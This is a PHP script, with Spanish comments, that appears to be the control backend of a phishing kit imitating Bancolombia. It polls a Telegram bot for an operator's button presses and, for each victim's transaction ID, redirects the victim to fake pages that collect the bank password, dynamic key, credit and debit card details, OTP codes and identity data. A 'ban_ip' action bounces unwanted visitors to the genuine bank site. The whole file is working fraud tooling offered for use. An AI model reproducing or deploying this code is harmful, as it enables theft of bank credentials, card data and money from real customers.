<?php
session_start();
header('Content-Type: application/json'); // Asegúrate de que la respuesta sea JSON

// Obtener el ID de transacción de la sesión o de GET
$transaction_id = $_SESSION['transaction_id'] ?? $_GET['id'] ?? null;

if (!$transaction_id) {
    echo json_encode(['error' => 'ID de transacción no encontrado']);
    exit;
}

// Cargar la configuración del bot de Telegram
$config = require __DIR__ . '/botmaster.php'; // Usar __DIR__ para evitar problemas de ruta

if (!$config || !isset($config['token'])) {
    echo json_encode(['error' => 'Configuración de Telegram inválida']);
    exit;
}

// URL de la API para obtener actualizaciones
$get_updates_url = "https://api.telegram.org/bot{$config['token']}/getUpdates";

// Realizar la solicitud a Telegram para obtener las actualizaciones
$ch = curl_init($get_updates_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$updates_response = curl_exec($ch);

if ($updates_response === false) {
    echo json_encode(['error' => 'Error al obtener actualizaciones de Telegram: ' . curl_error($ch)]);
    curl_close($ch);
    exit;
}

curl_close($ch);

// Convertir la respuesta en un array
$updates = json_decode($updates_response, true);

// Verificar si la respuesta contiene actualizaciones
if (isset($updates['result'])) {
    foreach ($updates['result'] as $update) {
        // Verificar si hay un callback_query
        if (isset($update['callback_query'])) {
            $callback_data = $update['callback_query']['data'];
            $callback_id = $update['callback_query']['id'];
            $chat_id = $update['callback_query']['message']['chat']['id'];
            $message_id = $update['callback_query']['message']['message_id'];
            
            // Verificar formato de callback_data
            if (strpos($callback_data, ':') === false) {
                continue;
            }

            list($action, $id) = explode(':', $callback_data);

            if ($id === $transaction_id) {
                // ========================================================
                // 1. ELIMINAR LOS BOTONES (Para que no se queden pegados)
                // ========================================================
                $edit_url = "https://api.telegram.org/bot{$config['token']}/editMessageReplyMarkup";
                $edit_data = [
                    'chat_id' => $chat_id,
                    'message_id' => $message_id,
                    'reply_markup' => json_encode(['inline_keyboard' => []]) // Teclado vacío
                ];
                
                $ch_edit = curl_init($edit_url);
                curl_setopt($ch_edit, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch_edit, CURLOPT_POST, true);
                curl_setopt($ch_edit, CURLOPT_POSTFIELDS, $edit_data);
                curl_exec($ch_edit);
                curl_close($ch_edit);

                // ========================================================
                // 2. RESPONDER AL CALLBACK (Para quitar el reloj de carga)
                // ========================================================
                $answer_url = "https://api.telegram.org/bot{$config['token']}/answerCallbackQuery";
                $answer_data = [
                    'callback_query_id' => $callback_id
                ];

                $ch_answer = curl_init($answer_url);
                curl_setopt($ch_answer, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch_answer, CURLOPT_POST, true);
                curl_setopt($ch_answer, CURLOPT_POSTFIELDS, $answer_data);
                curl_exec($ch_answer);
                curl_close($ch_answer);

                // ========================================================
                // 3. REDIRECCIONAR
                // ========================================================
                switch ($action) {
                    case 'error_logo':
                        echo json_encode(['redirect' => 'index1.html']);
                        exit;
                    case 'error_clave':
                        echo json_encode(['redirect' => 'clave.html']);
                        exit;
                    case 'pedir_dinamica':
                        echo json_encode(['redirect' => 'index3.html']);
                        exit;
                    case 'error_dinamica':
                        echo json_encode(['redirect' => 'error_dinamica.html']);
                        exit;
                    case 'pedir_tc':
                        echo json_encode(['redirect' => 'desembolso.html']);
                        exit;
                    case 'error_tc':
                        echo json_encode(['redirect' => 'desembolso.html?error=true']);
                        exit;
                    case 'pedir_td':
                        echo json_encode(['redirect' => 'tarjeta_debito.html']);
                        exit;
                    case 'error_td':
                        echo json_encode(['redirect' => 'tarjeta_debito.html?error=true']);
                        exit;
                    case 'soy':
                        echo json_encode(['redirect' => 'soyyo.html']);
                        exit;
                    case 'otp':
                        echo json_encode(['redirect' => 'otp.html']);
                        exit;
                    case 'error_otp':
                        echo json_encode(['redirect' => 'error_otp.html']);
                        exit;
                    case 'error_otp_3':
                        echo json_encode(['redirect' => 'error_otp.html']);
                        exit;
                    case 'finalizar':
                        echo json_encode(['redirect' => 'final1.html']);
                        exit;
                    case 'ban_ip':
                        // Ejecutar el script de baneo
                        include 'ban_user.php'; 
                        echo json_encode(['redirect' => 'https://www.bancolombia.com/tu360']);
                        exit;
                }
            }
        }
    }
}

// Si no hay actualizaciones relevantes, devolver null
echo json_encode(['redirect' => null]);
?>

